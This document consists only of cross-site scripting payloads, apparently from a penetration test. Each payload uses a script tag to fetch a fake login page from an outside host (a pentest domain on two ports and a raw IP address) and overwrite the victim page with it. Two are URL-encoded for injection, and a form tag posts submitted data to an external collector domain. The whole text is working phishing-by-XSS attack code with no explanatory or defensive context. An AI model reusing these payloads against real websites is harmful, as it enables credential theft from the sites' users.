```
<script>
fetch("http://pentest-www.xmco.tech:4444/LoginPage.html")
  .then(response => response.text())
  .then(html => {
    document.open();
    document.write(html);
    document.close();
  });
</script>
```

```
<form name=aspnetForm method=post action="https://lahjophqvvwtpdiebloc13fkz5x1o9tq9.ooc.newtechjob.com" id=aspnetForm>
```

```
%3Cscript%3Efetch%28%22http%3A%2F%2Fpentest-www.xmco.tech%3A5555%2FLoginPage.html%22%29.then%28r%3D%3Er.text%28%29%29.then%28html%3D%3E%7Bdocument.open%28%29%3Bdocument.write%28html%29%3Bdocument.close%28%29%3B%7D%29%3B%3C%2Fscript%3E
```

```
%3Cscript%3Efetch%28%22http%3A%2F%2F212.129.9.19%3A5555%2FLoginPage.html%22%29.then%28r%3D%3Er.text%28%29%29.then%28html%3D%3E%7Bdocument.body.innerHTML%3Dhtml%3B%7D%29%3B%3C%2Fscript%3E
```

